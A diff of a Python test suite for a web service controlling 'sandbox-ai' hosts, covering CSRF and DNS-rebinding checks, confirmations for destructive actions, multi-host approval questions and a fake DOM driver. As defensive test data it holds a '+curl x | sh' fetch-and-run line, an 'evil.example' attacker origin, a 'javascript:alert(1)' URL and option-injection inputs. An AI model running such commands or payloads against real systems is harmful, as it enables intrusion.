@@ -234,19 +234,19 @@ def test_changes_need_the_csrf_token_same_origin_json_and_a_known_host_name():
     _, headers, body = login(svc, secret)
     cookie, csrf = cookie_of(headers), body["csrf"]
     ok = {**HEADERS, "Cookie": cookie, "X-CSRF-Token": csrf}
-    path = "/api/hosts/local/starts/web/stop"
-    assert svc.handle("POST", path, ok, b"{}", "192.0.2.1")[0] == 200
+    path, sure = "/api/hosts/local/starts/web/stop", b'{"confirm": true}'
+    assert svc.handle("POST", path, ok, sure, "192.0.2.1")[0] == 200
     assert runner.calls[-1] == ("local", ["stop", "web"])
     for changed, status in [({"X-CSRF-Token": "x"}, 403), ({"X-CSRF-Token": None}, 403),
                             ({"Origin": "https://evil.example"}, 403), ({"Origin": None}, 403),
                             ({"Content-Type": "text/plain"}, 415), ({"Host": "evil.example"}, 421),
                             ({"Cookie": None}, 401)]:
         sent = {k: v for k, v in {**ok, **changed}.items() if v is not None}
-        assert svc.handle("POST", path, sent, b"{}", "192.0.2.1")[0] == status, changed
+        assert svc.handle("POST", path, sent, sure, "192.0.2.1")[0] == status, changed
     assert len(runner.calls) == 1, "nothing refused reached a host"
     # A Referer of the same origin is enough when the browser sends no Origin.
     sent = {**{k: v for k, v in ok.items() if k != "Origin"}, "Referer": "https://localhost:8443/"}
-    assert svc.handle("POST", path, sent, b"{}", "192.0.2.1")[0] == 200
+    assert svc.handle("POST", path, sent, sure, "192.0.2.1")[0] == 200
     assert svc.handle("GET", "/", {"Host": "evil.example"}, b"", "192.0.2.1")[0] == 421, "DNS rebinding"
 
 
@@ -273,10 +273,19 @@ def logged_in():
     ("POST", "/api/hosts/ct1/starts/web/pause", {}, ["pause", "web"]),
     ("POST", "/api/hosts/ct1/starts/web/resume", {}, ["resume", "web"]),
     ("POST", "/api/hosts/ct1/starts/web/delete", {"confirm": True}, ["delete", "web", "--yes"]),
+    ("POST", "/api/hosts/ct1/starts/web/stop", {"confirm": True}, ["stop", "web"]),
+    ("GET", "/api/hosts/ct1/starts/web/review", None, ["resume", "web", "--review-home", "--json"]),
     ("GET", "/api/hosts/ct1/approvals", None, ["approvals", "list", "--json"]),
     ("POST", "/api/hosts/ct1/approvals/12-3-4", {"decision": "allow", "scope": "run"},
      ["approvals", "allow", "12-3-4", "--scope", "run"]),
     ("POST", "/api/hosts/ct1/approvals/12-3-4", {"decision": "deny"}, ["approvals", "deny", "12-3-4"]),
+    ("POST", "/api/hosts/ct1/approvals/12-3-4", {"decision": "deny", "scope": "run"},
+     ["approvals", "deny", "12-3-4", "--scope", "run"]),
+    ("POST", "/api/hosts/ct1/approvals/12-3-4", {"decision": "deny", "scope": "always", "confirm": True},
+     ["approvals", "deny", "12-3-4", "--scope", "always"]),
+    # a browser question whose link the user opened: allowed without opening a browser on that host
+    ("POST", "/api/hosts/ct1/approvals/12-3-4", {"decision": "allow", "scope": "once", "no_open": True},
+     ["approvals", "allow", "12-3-4", "--scope", "once", "--no-open"]),
     ("GET", "/api/hosts/ct1/doctor", None, ["doctor", "--json"]),
     ("GET", "/api/hosts/ct1/logs", None, ["logs", "--json"]),
     ("GET", "/api/hosts/ct1/llm", None, ["llm", "list", "--json"]),
@@ -291,6 +300,14 @@ def logged_in():
     ("POST", "/api/hosts/ct1/defaults", {"key": "telemetry", "value": "strict"},
      ["defaults", "set", "telemetry", '"strict"']),
     ("POST", "/api/hosts/ct1/defaults", {"key": "telemetry", "value": None}, ["defaults", "unset", "telemetry"]),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "mode", "value": "high"}, ["defaults", "set", "mode", '"high"']),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "mode", "value": "lax", "confirm": True},
+     ["defaults", "set", "mode", '"lax"']),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "telemetry", "value": "on", "confirm": True},
+     ["defaults", "set", "telemetry", '"on"']),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "canaries", "value": False, "confirm": True},
+     ["defaults", "set", "canaries", "false"]),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "canaries", "value": ["home"]}, ["defaults", "set", "canaries", '["home"]']),
     # the network of a running sandbox: every value as --flag=VALUE, the token never (only where it is)
     ("GET", "/api/hosts/ct1/net/web", None, ["net", "show", "web", "--json"]),
     ("POST", "/api/hosts/ct1/net/web", {"op": "allow", "allow_host": ["pypi.org"], "allow_tcp": ["192.0.2.9:5432"],
@@ -324,8 +341,10 @@ def logged_in():
     ("POST", "/api/hosts/ct1/devices/web/remove", {"device": "3"}, ["devices", "remove", "web", "3"]),
     ("POST", "/api/hosts/ct1/devices/web/remove", {"device": "/dev/bus/usb/001/004"},
      ["devices", "remove", "web", "/dev/bus/usb/001/004"]),
-    ("POST", "/api/hosts/ct1/limits/web", {"memory": "8g", "cpus": "1.5", "pids": "none"},
+    ("POST", "/api/hosts/ct1/limits/web", {"memory": "8g", "cpus": "1.5", "pids": "none", "confirm": True},
      ["limits", "web", "--memory=8g", "--cpus=1.5", "--pids=none"]),
+    ("POST", "/api/hosts/ct1/limits/web", {"memory": "8g", "cpus": "1.5"}, ["limits", "web", "--memory=8g", "--cpus=1.5"]),
+    ("GET", "/api/hosts/ct1/limits/web", None, ["limits", "web", "--show", "--json"]),
     ("POST", "/api/hosts/local/limits/web", {"memory": "", "pids": "4096"}, ["limits", "web", "--pids=4096"]),
     ("GET", "/api/hosts/ct1/vpn", None, ["vpn", "list", "--json"]),
     ("POST", "/api/hosts/ct1/vpn", {"name": "home", "kind": "wireguard", "file": "/etc/wireguard/home.conf"},
@@ -372,6 +391,28 @@ def test_each_action_is_one_fixed_command(logged_in, method, path, data, args):
     ("PUT", "/api/hosts/ct1/starts", None, 405),
     ("POST", "/api/hosts/ct1/starts/--all/stop", {}, 400),
     ("POST", "/api/hosts/ct1/starts/web/delete", {}, 400),
+    # what ends or weakens something needs its confirmation (the page asks first)
+    ("POST", "/api/hosts/ct1/starts/web/stop", {}, 400),
+    ("POST", "/api/hosts/ct1/starts/web/stop", {"confirm": "yes"}, 400),
+    ("POST", "/api/hosts/ct1/starts/web/delete", {"confirm": 1}, 400),
+    ("GET", "/api/hosts/ct1/starts/--all/review", None, 400),
+    ("GET", "/api/hosts/ct1/starts/-h/review", None, 400),
+    ("POST", "/api/hosts/ct1/starts/web/review", {}, 405),
+    ("POST", "/api/hosts/ct1/approvals/1-2", {"decision": "deny", "scope": "always"}, 400),
+    ("POST", "/api/hosts/ct1/approvals/1-2", {"decision": "deny", "scope": "always", "confirm": "true"}, 400),
+    ("POST", "/api/hosts/ct1/approvals/1-2", {"decision": "deny", "no_open": True}, 400),
+    ("POST", "/api/hosts/ct1/approvals/1-2", {"decision": "allow", "no_open": "yes"}, 400),
+    ("POST", "/api/hosts/ct1/approvals/-x", {"decision": "allow", "no_open": True}, 400),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "mode", "value": "lax"}, 400),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "mode", "value": "low"}, 400),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "telemetry", "value": "on"}, 400),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "canaries", "value": False}, 400),
+    ("POST", "/api/hosts/ct1/defaults", {"key": "canaries", "value": False, "confirm": 1}, 400),
+    ("POST", "/api/hosts/ct1/limits/web", {"memory": "none"}, 400),
+    ("POST", "/api/hosts/ct1/limits/web", {"memory": "8g", "pids": "none"}, 400),
+    ("POST", "/api/hosts/ct1/limits/web", {"cpus": "none", "confirm": "yes"}, 400),
+    ("GET", "/api/hosts/ct1/limits/--all", None, 400),
+    ("GET", "/api/hosts/ct1/limits/-h", None, 400),
     ("POST", "/api/hosts/ct1/starts/web/exec", {}, 404),
     ("POST", "/api/hosts/ct1/approvals/a b", {"decision": "allow"}, 400),
     # Regression: an id with a leading "-" reached the host, read there as an option (-h answered with the help).
@@ -439,7 +480,8 @@ def test_each_action_is_one_fixed_command(logged_in, method, path, data, args):
     ("POST", "/api/hosts/ct1/limits/web", {"pids": "--memory=none"}, 400),
     ("POST", "/api/hosts/ct1/limits/web", {"memory": "unlimited"}, 400),
     ("POST", "/api/hosts/ct1/limits/--all", {"memory": "8g"}, 400),
-    ("GET", "/api/hosts/ct1/limits/web", None, 405),
+    ("DELETE", "/api/hosts/ct1/limits/web", None, 405),
+    ("POST", "/api/approvals", {}, 405),
     ("POST", "/api/hosts/ct1/vpn", {"name": "Home", "kind": "wireguard", "file": "/x"}, 400),
     ("POST", "/api/hosts/ct1/vpn", {"name": "home", "kind": "ipsec"}, 400),
     ("POST", "/api/hosts/ct1/vpn", {"name": "home", "kind": "wireguard", "file": "relative.conf"}, 400),
@@ -484,7 +526,7 @@ def test_a_running_sandboxs_workspaces_and_devices_come_as_the_command_lists_the
     status, out = logged_in("POST", "/api/hosts/ct1/workspaces/web/remove", {"workspace": "/workspaces/lib"})
     assert status == 502 and "is in use in the sandbox: 42 bash (cwd)" in out["error"] and "on ct1" in out["error"]
     logged_in.runner.answers[("limits",)] = (1, "", "sandbox-ai limits: --memory none: no limit (security mode high)")
-    status, out = logged_in("POST", "/api/hosts/ct1/limits/web", {"memory": "none"})
+    status, out = logged_in("POST", "/api/hosts/ct1/limits/web", {"memory": "none", "confirm": True})
     assert status == 502 and "security mode high" in out["error"]
     logged_in.runner.answers[("devices", "list")] = (1, "", "sandbox-ai devices: no sandbox named web runs")
     status, out = logged_in("GET", "/api/hosts/ct1/devices/web")
@@ -900,7 +942,7 @@ def test_the_page_shows_results_and_errors_as_toasts_not_alerts():
     script = (WEB / "app.js").read_text()
     css = (WEB / "app.css").read_text()
     assert "alert(" not in script, "errors and results are toasts in the theme, not the browser's dialog"
-    assert script.count("confirm(") == 6, "confirmations stay confirm()"
+    assert "window.confirm" not in script and " confirm(`" not in script, "confirmations are asked in the page"
     assert "function toast(level, title, text, options)" in script and 'role: level === "error" ? "alert" : "status"' in script
     assert ".innerHTML" not in script and "insertAdjacentHTML" not in script and "outerHTML" not in script
     for level, colour in (("success", "--ok"), ("warning", "--warn"), ("error", "--bad")):
@@ -1210,6 +1252,91 @@ def test_an_answer_to_a_question_gets_more_time_than_the_approvals_wait(logged_i
     assert status == 200, out
     approvals = w.module("approvals")
     assert timeouts[-1] >= approvals.VERIFY_WAIT + 30, timeouts
+
+
+def test_the_questions_of_every_host_come_together_and_a_failing_host_is_named(logged_in, monkeypatch):
+    """GET /api/approvals asks every host (this machine and each of `sandbox-ai hosts`) at once, each with its own
+    time limit: the questions with their host (a question cannot name another host for itself), and why a host
+    could not be asked, without holding up the others."""
+    hosts = w.module("hosts")
+    hosts.save({name: hosts.check(name, {"ssh": f"admin@192.0.2.{i}"}) for i, name in enumerate(("ct1", "ct2", "ct3",
+                                                                                                    "slow"), 10)})
+    monkeypatch.setattr(w, "APPROVALS_HOST_SECONDS", 1)
+    asked, release = [], threading.Event()
+
+    def runner(host, args, timeout=120, input=None):
+        asked.append((host, args, timeout))
+        if host == "local":
+            return 0, json.dumps([{"id": "1-1", "run": "web", "kind": "dns", "question": "look up pypi.org",
+                                   "timeout": 60, "seconds_left": 42, "max_scope": "always"}]), ""
+        if host == "ct1":
+            return 0, json.dumps([{"id": "2-1", "host": "local", "kind": "browser", "url": "https://example.org/x",
+                                   "seconds_left": 9, "max_scope": "once"}, "not a question"]), ""
+        if host == "ct2":
+            return 255, "", "ssh: connect to host 192.0.2.11 port 22: Connection refused\x1b[2J"
+        if host == "slow":
+            release.wait(10)
+            return 0, "[]", ""
+        return 0, json.dumps({"not": "a list"}), ""
+    logged_in.svc.api.runner = runner
+    started = time.monotonic()
+    status, out = logged_in("GET", "/api/approvals")
+    release.set()
+    assert status == 200, out
+    assert time.monotonic() - started < 9, "a host that does not answer holds nobody up"
+    assert out["questions"] == [
+        {"id": "1-1", "run": "web", "kind": "dns", "question": "look up pypi.org", "timeout": 60, "seconds_left": 42,
+         "max_scope": "always", "host": "local"},
+        {"id": "2-1", "host": "ct1", "kind": "browser", "url": "https://example.org/x", "seconds_left": 9,
+         "max_scope": "once"}]
+    assert set(out["errors"]) == {"ct2", "ct3", "slow"}
+    assert "Connection refused" in out["errors"]["ct2"] and "\x1b" not in out["errors"]["ct2"]
+    assert "not a list of questions" in out["errors"]["ct3"] and "1 seconds" in out["errors"]["slow"]
+    assert sorted(host for host, _, _ in asked) == ["ct1", "ct2", "ct3", "local", "slow"]
+    assert all(args == ["approvals", "list", "--json"] and timeout == 1 for _, args, timeout in asked)
+    # Only this machine: one host, nothing else asked.
+    hosts.save({})
+    del asked[:]
+    assert logged_in("GET", "/api/approvals")[1]["errors"] == {} and [h for h, _, _ in asked] == ["local"]
+
+
+def test_what_ends_removes_or_weakens_needs_its_confirmation_on_the_server(logged_in):
+    """The page asks first; the service refuses the same request without {"confirm": true} (another page, a script
+    with the session's token): a stop, a delete, a limit taken away, a deny always, defaults that lower the
+    protection of later starts. With it, the one command runs."""
+    for path, body, args in (
+            ("/api/hosts/ct1/starts/web/stop", {}, ["stop", "web"]),
+            ("/api/hosts/ct1/starts/web/delete", {}, ["delete", "web", "--yes"]),
+            ("/api/hosts/ct1/limits/web", {"memory": "none", "cpus": "2"}, ["limits", "web", "--memory=none",
+                                                                          "--cpus=2"]),
+            ("/api/hosts/ct1/approvals/1-2", {"decision": "deny", "scope": "always"},
+             ["approvals", "deny", "1-2", "--scope", "always"]),
+            ("/api/hosts/ct1/defaults", {"key": "mode", "value": "low"}, ["defaults", "set", "mode", '"low"'])):
+        status, out = logged_in("POST", path, body)
+        assert status == 400 and '{"confirm": true}' in out["error"], (path, out)
+        assert logged_in.runner.calls == [], path
+        status, out = logged_in("POST", path, {**body, "confirm": True})
+        assert status == 200 and logged_in.runner.calls.pop() == ("ct1", args), (path, out)
+    # what does not end or weaken anything needs none
+    for path, body in (("/api/hosts/ct1/starts/web/pause", {}), ("/api/hosts/ct1/starts/web/resume", {}),
+                       ("/api/hosts/ct1/limits/web", {"memory": "16g"}),
+                       ("/api/hosts/ct1/approvals/1-2", {"decision": "deny", "scope": "run"}),
+                       ("/api/hosts/ct1/defaults", {"key": "mode", "value": "paranoid"})):
+        assert logged_in("POST", path, body)[0] == 200, path
+
+
+def test_the_current_limits_and_the_review_of_a_kept_home_come_as_the_commands_say(logged_in):
+    limits = {"memory": 8 << 30, "memory_high": 7 << 30, "cpus": 4.0, "pids": None}
+    logged_in.runner.answers[("limits",)] = (0, json.dumps(limits), "")
+    assert logged_in("GET", "/api/hosts/ct1/limits/web") == (200, limits)
+    review = {"name": "web", "id": "web", "state": "stopped", "pending": True,
+              "review": {"since": "2026-11-07T10:00:00Z", "run": "r1", "complete": True,
+                         "changes": [{"path": ".bashrc", "change": "changed", "kind": "file", "diff": "+curl x | sh"}]}}
+    logged_in.runner.answers[("resume",)] = (0, json.dumps(review), "")
+    assert logged_in("GET", "/api/hosts/local/starts/web/review") == (200, review)
+    logged_in.runner.answers[("resume",)] = (2, "", "sandbox-ai: web keeps no HOME: there is nothing to review")
+    status, out = logged_in("GET", "/api/hosts/local/starts/web/review")
+    assert status == 502 and "keeps no HOME" in out["error"]
 
 
 def test_an_unchanged_static_file_is_answered_with_304(logged_in, tmp_path, monkeypatch):
@@ -1567,30 +1694,41 @@ def test_a_connection_without_a_session_is_kept_only_briefly(server, monkeypatch
     user.close()
 
 
-APPROVALS_DRIVER = r"""
+# A small stand-in for the DOM, enough for app.js's pages (no innerHTML: it has none, so a use would fail).
+FAKE_DOM = r"""
 const fs = require("fs"), vm = require("vm");
 class Node {
   constructor(tag) { this.tagName = tag; this.children = []; this.attributes = {}; this.listeners = {}; this.parent = null;
-    this.className = ""; this.text = ""; this.hidden = false; this.disabled = false; }
+    this.className = ""; this.text = ""; this.hidden = false; this.disabled = false; this.dataset = {};
+    const node = this; this.classList = { toggle(c, on) { const set = new Set(node.className.split(" ").filter(Boolean));
+      if (on === undefined ? !set.has(c) : on) set.add(c); else set.delete(c); node.className = [...set].join(" "); },
+      add(c) { this.toggle(c, true); }, remove(c) { this.toggle(c, false); } }; }
   setAttribute(k, v) { this.attributes[k] = String(v); if (k === "id") this.id = String(v); }
   getAttribute(k) { return this.attributes[k]; }
+  removeAttribute(k) { delete this.attributes[k]; }
   addEventListener(type, f) { (this.listeners[type] = this.listeners[type] || []).push(f); }
-  fire(type) { for (const f of this.listeners[type] || []) f({ target: this }); }
-  append(...nodes) { for (const n of nodes) { if (n.parent) n.remove(); n.parent = this; this.children.push(n); } }
+  fire(type, extra) { for (const f of this.listeners[type] || []) f(Object.assign({ target: this, preventDefault() {} }, extra || {})); }
+  append(...nodes) { for (let n of nodes) { if (typeof n === "string") { const t = new Node("#text"); t.text = n; n = t; }
+    if (n.parent) n.remove(); n.parent = this; this.children.push(n); } }
   prepend(n) { n.parent = this; this.children.unshift(n); }
   remove() { if (this.parent) this.parent.children = this.parent.children.filter(c => c !== this); this.parent = null; }
   removeChild(n) { n.remove(); return n; }
+  replaceWith(n) { const i = this.parent.children.indexOf(this); if (n.parent) n.remove(); n.parent = this.parent; this.parent.children[i] = n; this.parent = null; }
+  focus() { globalThis.focused = this; }
+  get parentNode() { return this.parent; }
   get firstChild() { return this.children[0] || null; }
   get lastElementChild() { return this.children[this.children.length - 1]; }
   get isConnected() { let n = this; while (n.parent) n = n.parent; return n === body; }
   get textContent() { return this.tagName === "#text" ? this.text : this.children.map(c => c.textContent).join(""); }
+  set textContent(v) { this.children = []; if (String(v) !== "") this.append(String(v)); }
   all() { const out = []; const walk = n => { out.push(n); n.children.forEach(walk); }; walk(this); return out; }
-  querySelectorAll(sel) { return this.all().filter(n => n !== this && sel === ".badge" && (n.className || "").split(" ").includes("badge")); }
+  querySelector(sel) { return this.querySelectorAll(sel)[0] || null; }
+  querySelectorAll(sel) { const cls = sel.replace(/^\./, ""); return this.all().filter(n => n !== this && (n.className || "").split(" ").includes(cls)); }
 }
 const body = new Node("body");
 const nav = new Node("button");
 const document = {
-  body, createElement: t => new Node(t),
+  body, title: "", createElement: t => new Node(t),
   createTextNode: t => { const n = new Node("#text"); n.text = t; return n; },
   getElementById: id => body.all().find(n => n.id === id) || null,
   querySelector: sel => (sel === 'nav button[data-page="approvals"]' ? nav : null), querySelectorAll: () => [],
@@ -1605,49 +1743,109 @@ const fetch = async (path, opts) => {
   return { status: 200, ok: true, json: async () => data };
 };
 const context = vm.createContext({ document, Node, setTimeout: () => 0, clearTimeout() {}, setInterval: () => 0,
-  clearInterval() {}, console, window: {}, location: { host: "x" }, localStorage: { getItem: () => null, setItem() {} }, fetch });
+  clearInterval() {}, console, window: {}, location: { host: "x", hash: "" }, localStorage: { getItem: () => null, setItem() {} }, fetch });
+vm.runInContext("let __now = 1000000; Date.now = () => __now;", context);
 vm.runInContext(fs.readFileSync(process.argv[2], "utf8").replace(/loadThemes\(\)\.then\(render\);\s*$/, ""), context);
 const settle = async () => { for (let i = 0; i < 20; i++) await new Promise(r => setImmediate(r)); };
-const rows = () => body.all().filter(n => n.attributes["data-id"]);
 const button = (row, text) => row.all().find(n => n.tagName === "button" && n.textContent === text);
 const toasts = () => (document.getElementById("toasts") || new Node("x")).children.map(t => t.textContent);
+const main = new Node("main"); main.setAttribute("id", "main"); body.append(main);
+context.__main = main;
+"""
+
+APPROVALS_DRIVER = FAKE_DOM + r"""
+const rows = () => body.all().filter(n => n.attributes["data-id"]);
+const key = (r) => `${r.attributes["data-host"]} ${r.attributes["data-id"]}`;
+const row = (k) => rows().find(r => key(r) === k);
+const cell = (r, cls) => r.all().find(n => (n.className || "").split(" ").includes(cls));
 (async () => {
   const result = {};
-  const main = new Node("main"); main.setAttribute("id", "main"); body.append(main);
   vm.runInContext('state.me = { user: "admin", csrf: "c" }; state.page = "approvals"; state.host = "local";', context);
-  const q = (id, question) => ({ id, run: "claude-web", sandbox: "claude-web", kind: "connect", question, always: "Allow always: pypi.org" });
-  let open = [q("1-1", "connect to pypi.org:443"), q("1-2", "look up example.org")];
+  const q = (host, id, question, extra) => Object.assign({ host, id, run: "claude-web", sandbox: "claude-web", kind: "connect", question,
+    always: "Allow always: pypi.org", seconds_left: 45, max_scope: "always" }, extra || {});
+  let open = [q("local", "1-1", "connect to pypi.org:443"), q("local", "1-2", "look up example.org"),
+    q("ct1", "1-1", "open the login page", { kind: "browser", url: "https://login.example.org/device?code=1", seconds_left: 15, max_scope: "run" }),
+    q("ct1", "1-4", "open this", { kind: "browser", url: "javascript:alert(1)", seconds_left: 8, max_scope: "once" })];
+  let errors = {};
   answer = (method, path, sent) => {  // an answered question is no longer open
-    if (method === "GET") return open;
-    open = open.filter(x => !path.endsWith(`/${x.id}`));
+    if (method === "GET") return open instanceof Error ? open : { questions: open, errors };
+    open = open.filter(x => path !== `/api/hosts/${x.host}/approvals/${x.id}`);
     return { output: `sandbox-ai approvals: ${sent}` };
   };
-  context.__main = main;
   await vm.runInContext("pages.approvals(__main)", context);
-  result.first = rows().map(r => r.attributes["data-id"]);
-  const kept = rows()[0], scope = kept.all().find(n => n.tagName === "select");
+  result.first = rows().map(key);
+  result.title = document.title;
+  result.countdown = rows().map(r => [cell(r, "countdown").textContent, cell(r, "countdown").className]);
+  const browser = row("ct1 1-1"), bad = row("ct1 1-4");
+  const link = browser.all().find(n => n.tagName === "a");
+  result.link = link && [link.getAttribute("href"), link.getAttribute("target"), link.getAttribute("rel"), link.textContent];
+  result.badLink = bad.all().some(n => n.tagName === "a") || Boolean(button(bad, "Opened it — allow"));
+  const options = (r) => r.all().filter(n => n.tagName === "option").map(o => [o.value, o.textContent, "disabled" in o.attributes]);
+  result.options = [options(row("local 1-1")), options(browser), options(bad)];
+  result.block = ["local 1-1", "ct1 1-1", "ct1 1-4"].map(k => Boolean(button(row(k), "Block always…")));
+  // one second at a time, here: no request for it
+  const before = calls.length;
+  vm.runInContext("__now += 10000; tickApprovals();", context);
+  result.later = rows().map(r => cell(r, "countdown").textContent);
+  result.expired = [cell(bad, "countdown").className, bad.textContent.includes("refused: no answer in time"), Boolean(button(bad, "Allow"))];
+  result.tickRequests = calls.length - before;
+  // kept between polls, with the scope chosen
+  const kept = row("local 1-1"), scope = kept.all().find(n => n.tagName === "select");
   scope.value = "always";
-  open = [q("1-1", "connect to pypi.org:443"), q("1-3", "connect to 192.0.2.9:5432")];
+  open = open.filter(x => x.id !== "1-2").concat([q("local", "1-3", "connect to 192.0.2.9:5432")]);
   await vm.runInContext("poll()", context); await settle();
-  result.polled = rows().map(r => r.attributes["data-id"]);
-  result.sameRow = rows()[0] === kept; result.sameScope = kept.all().includes(scope) && scope.value === "always";
-  result.background = calls.filter(c => c.method === "GET").map(c => c.headers["X-Background"] || null);
+  result.polled = rows().map(key);
+  result.sameRow = row("local 1-1") === kept; result.sameScope = kept.all().includes(scope) && scope.value === "always";
+  result.background = calls.filter(c => c.method === "GET").map(c => [c.path, c.headers["X-Background"] || null]);
+  // Allow asks in the row first, naming the host
   button(kept, "Allow").fire("click");
   result.asked = kept.all().find(n => n.className === "confirm").textContent;
   result.postedBeforeYes = calls.filter(c => c.method === "POST").length;
   await vm.runInContext("poll()", context); await settle();
-  result.stillAsking = rows()[0] === kept && Boolean(button(kept, "Yes, allow"));
+  result.stillAsking = row("local 1-1") === kept && Boolean(button(kept, "Yes, allow"));
   button(kept, "Yes, allow").fire("click"); await settle();
-  const post = calls.find(c => c.method === "POST");
-  result.post = [post.path, JSON.parse(post.body)];
-  result.toast = toasts().find(t => t.includes("sandbox-ai approvals:")) || null;
-  open = new Error("ssh: connect to host ct1 port 22: Connection refused");
+  // the browser question of ct1: its link opened here, allowed there without opening a browser
+  browser.all().find(n => n.tagName === "select").value = "run";
+  button(browser, "Opened it — allow").fire("click");
+  result.askedNoOpen = browser.all().find(n => n.className === "confirm").textContent;
+  button(browser, "Yes, allow").fire("click"); await settle();
+  // Deny: for the run; Block always: asked first
+  const other = row("local 1-3");
+  button(other, "Block always…").fire("click");
+  result.askedBlock = other.all().find(n => n.className === "confirm").textContent;
+  result.postsBeforeBlock = calls.filter(c => c.method === "POST").length;
+  button(other, "Yes, block always").fire("click"); await settle();
+  open.push(q("ct1", "2-1", "look up x.org", { max_scope: "always" }));
+  await vm.runInContext("poll()", context); await settle();
+  button(row("ct1 2-1"), "Deny").fire("click"); await settle();
+  result.posts = calls.filter(c => c.method === "POST").map(c => [c.path, JSON.parse(c.body)]);
+  result.toast = toasts().filter(t => t.includes("sandbox-ai approvals:"));
+  // a host that cannot be asked keeps its rows and is named; the others are shown
+  open = [q("ct1", "1-4", "open this", { seconds_left: 30 }), q("local", "5-1", "connect to a.org:443")];
+  errors = {};
+  await vm.runInContext("poll()", context); await settle();
+  result.revived = [Boolean(button(row("ct1 1-4"), "Allow")), cell(row("ct1 1-4"), "countdown").textContent];
+  open = [q("local", "5-1", "connect to a.org:443")];
+  errors = { ct1: "ssh: connect to host ct1 port 22: No route to host" };
+  await vm.runInContext("poll()", context); await settle();
+  result.partly = [rows().map(key), main.all().filter(n => (n.className || "").includes("notice")).map(n => n.textContent), document.title];
+  // the whole check failed: "?", never 0, and the rows stay
+  open = new Error("the service could not be reached");
   await vm.runInContext("poll()", context); await settle();
   const badge = nav.children.find(n => (n.className || "").includes("badge"));
   result.badge = badge ? [badge.textContent, badge.getAttribute("aria-label")] : null;
   result.count = vm.runInContext("state.approvals", context);
   result.notice = main.all().filter(n => (n.className || "").includes("notice")).map(n => n.textContent);
-  result.rowsAfterError = rows().map(r => r.attributes["data-id"]);
+  result.rowsAfterError = rows().map(key);
+  // elsewhere in the page: a new question is a toast that stays until it is answered or gone
+  vm.runInContext('state.page = "logs";', context);
+  open = [q("local", "5-1", "connect to a.org:443"), q("ct1", "6-1", "connect to b.org:443")];
+  errors = {};
+  await vm.runInContext("poll()", context); await settle();
+  result.newToasts = toasts().filter(t => t.includes("sandbox-ai asks"));
+  open = [q("local", "5-1", "connect to a.org:443")];
+  await vm.runInContext("poll()", context); await settle();
+  result.toastsAfter = toasts().filter(t => t.includes("sandbox-ai asks"));
   result.close = [vm.runInContext('closeText({ code: 1008, reason: "refused: at most 8 terminals at once\u001b[2J" }, true)', context),
     vm.runInContext('closeText({ code: 1006, reason: "" }, false)', context)];
   console.log(JSON.stringify(result));
@@ -1655,31 +1853,163 @@ const toasts = () => (document.getElementById("toasts") || new Node("x")).childr
 """
 
 
-@pytest.mark.skipif(not shutil.which("node"), reason="needs node")
-def test_the_approvals_table_is_kept_between_polls(tmp_path):
-    """app.js in node with a small stand-in for the DOM: the rows are keyed by the question's id (a poll adds and
-    removes rows, the others stay with the scope chosen in them); Allow asks in the row first, naming the sandbox,
-    what it asks and the scope; the answer's output is a toast; the polls are background requests, and a failed one
-    shows "?" ("could not check"), never 0, and leaves the rows."""
-    driver = tmp_path / "approvals.js"
-    driver.write_text(APPROVALS_DRIVER)
+def run_driver(tmp_path, source, name):
+    driver = tmp_path / f"{name}.js"
+    driver.write_text(source)
     run = subprocess.run(["node", str(driver), str(WEB / "app.js")], capture_output=True, text=True, timeout=60)
     assert run.returncode == 0, run.stderr
-    result = json.loads(run.stdout)
-    assert result["first"] == ["1-1", "1-2"] and result["polled"] == ["1-1", "1-3"]
+    return json.loads(run.stdout)
+
+
+@pytest.mark.skipif(not shutil.which("node"), reason="needs node")
+def test_the_approvals_table_is_kept_between_polls(tmp_path):
+    """app.js in node with a small stand-in for the DOM: the questions of every host in one table, keyed by host and
+    id (a poll adds and removes rows, the others stay with the scope chosen in them), each counting down its time
+    left (amber below 20 s, red below 10 s) without a request; Allow asks in the row first, naming the host, the
+    sandbox, what it asks and the scope, and the answer goes to the question's own host; a browser question's link
+    (http(s) only) and "Opened it — allow" (no_open); Deny is for the run, Block always is asked first; scopes wider
+    than the question allows are disabled; the tab's title has the count; a host that cannot be asked keeps its rows
+    and is named; a failed check shows "?", never 0; a new question elsewhere is a toast until it is gone."""
+    result = run_driver(tmp_path, APPROVALS_DRIVER, "approvals")
+    assert result["first"] == ["local 1-1", "local 1-2", "ct1 1-1", "ct1 1-4"] and result["title"] == "(4) sandbox-ai"
+    assert result["countdown"] == [["45 s", "countdown"], ["45 s", "countdown"], ["15 s", "countdown warn"],
+                                   ["8 s", "countdown bad"]]
+    assert result["link"] == ["https://login.example.org/device?code=1", "_blank", "noopener noreferrer",
+                              "https://login.example.org/device?code=1"]
+    assert result["badLink"] is False, "a javascript: URL is no link, and offers no Opened it"
+    labels = [["once", "this once"], ["run", "for the rest of this run"], ["always", "always (remembered for the project)"]]
+    assert result["options"] == [[[*l, False] for l in labels], [[*labels[0], False], [*labels[1], False], [*labels[2], True]],
+                                 [[*labels[0], False], [*labels[1], True], [*labels[2], True]]]
+    assert result["block"] == [True, False, False], "Block always only where an always is possible"
+    assert result["later"] == ["35 s", "35 s", "5 s", "expired"] and result["tickRequests"] == 0
+    assert result["expired"] == ["countdown bad", True, False]
+    assert result["polled"] == ["local 1-1", "ct1 1-1", "ct1 1-4", "local 1-3"]
     assert result["sameRow"] and result["sameScope"], "an unchanged row stays, with its scope"
-    assert result["background"] == [None, "1"], "the page's own load counts, the poll does not"
+    assert result["background"] == [["/api/approvals", None], ["/api/approvals", "1"]], "the page's own load counts"
     assert result["postedBeforeYes"] == 0 and result["stillAsking"]
-    asked = result["asked"]
-    for part in ("claude-web", "connect to pypi.org:443", "always (remembered for the project)", "Allow always: pypi.org"):
-        assert part in asked, (part, asked)
-    assert result["post"] == ["/api/hosts/local/approvals/1-1", {"decision": "allow", "scope": "always"}]
-    assert result["toast"] and '"scope":"always"' in result["toast"], "the command's output is shown"
+    for part in ("claude-web", "on local", "connect to pypi.org:443", "always (remembered for the project)",
+                 "Allow always: pypi.org"):
+        assert part in result["asked"], (part, result["asked"])
